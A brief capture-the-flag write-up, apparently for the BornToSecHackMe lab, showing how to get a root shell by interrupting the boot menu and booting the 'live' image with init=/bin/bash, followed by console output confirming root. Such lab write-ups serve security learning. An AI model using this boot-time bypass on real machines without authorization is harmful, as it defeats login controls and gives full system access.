# Bonus 2

By repeatedly pressing ESC when starting GRUB we have access to its console, therefore by pressing TAB we have the list of all available images, in our case only "live", so just write the command:
```shell
live init = /bin/bash
```
```shell
 aborted.
boot:
 live
boot: live init=/bin/bash
error: unexpectedly disconnected from boot status daemon
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@BornToSecHackMe:/# id
uid=0(root) gid=0(root) groups=0(root)
root@BornToSecHackMe:/# whoami
root
root@BornToSecHackMe:/# 
```